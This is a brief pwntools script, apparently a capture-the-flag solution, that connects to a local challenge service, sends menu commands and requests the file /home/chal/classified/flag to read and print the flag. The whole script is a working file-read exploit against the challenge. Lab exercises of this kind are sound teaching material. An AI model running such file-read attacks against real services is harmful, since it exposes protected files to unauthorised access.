from pwn import *

p = remote('localhost', 2002)

p.sendline('S')
p.sendline('.')
p.sendline('R')
p.sendlineafter('Filename? ', '/home/chal/classified/flag')

flag = p.recvline()
log.info(flag)

p.close()
